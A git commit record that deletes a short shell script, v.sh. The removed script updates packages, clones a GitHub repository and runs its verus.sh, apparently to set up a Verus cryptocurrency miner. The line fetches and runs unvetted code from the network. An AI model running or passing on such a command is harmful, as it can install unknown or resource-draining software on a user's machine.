0279293a59c64091f5f6b4f3f8da4eb8e692ac97
Omarjetos <93458140+Omarjetos@users.noreply.github.com>
2021-11-06 17:07:03 +0700

    Delete v.sh

--- v.sh
+++
@@ -1,2 +0,0 @@
-#omarjeto
-apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 git && git clone https://github.com/Omarjetos/ezz.git && cd ezz && chmod +x compile.sh && chmod +x verus.sh && ./verus.sh
